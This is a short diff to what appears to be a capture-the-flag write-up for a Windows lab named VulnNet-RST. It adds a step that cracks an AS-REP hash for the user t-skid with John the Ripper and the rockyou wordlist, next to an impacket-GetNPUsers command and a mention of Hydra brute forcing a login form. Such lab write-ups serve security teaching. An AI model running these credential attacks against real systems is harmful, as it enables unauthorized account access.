@@ -65,6 +65,14 @@ impacket-GetNPUsers 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip 10.10.17
 ```
 ![hash1](/images/hash1.jpg)
 
+We obtained the hash for the user t-skid. We can try brute force it:
+
+```
+john hash1 --wordlist=/home/kali/rockyou.txt 
+```
+
+![crackedhash](/images/crackedhash.jpg)
+
 ## Exploitation
 
 We can use Hydra to brute force HTTP-POST-FORM:
